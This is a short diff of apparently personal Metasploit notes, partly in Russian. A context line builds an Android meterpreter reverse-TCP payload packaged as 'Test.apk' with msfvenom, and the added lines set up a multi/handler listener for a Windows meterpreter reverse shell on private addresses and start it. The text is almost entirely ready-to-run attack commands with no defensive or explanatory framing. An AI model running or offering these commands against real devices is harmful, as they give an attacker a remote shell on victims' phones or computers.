@@ -22,4 +22,12 @@ run
 Для АНДРОИД
 msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk
 
+use exploit/mulit/handler
 
+set payload windows/meterpreter/reverse_tcp
+
+set lhost 192.168.0.9
+
+set lport 4444
+
+exploit
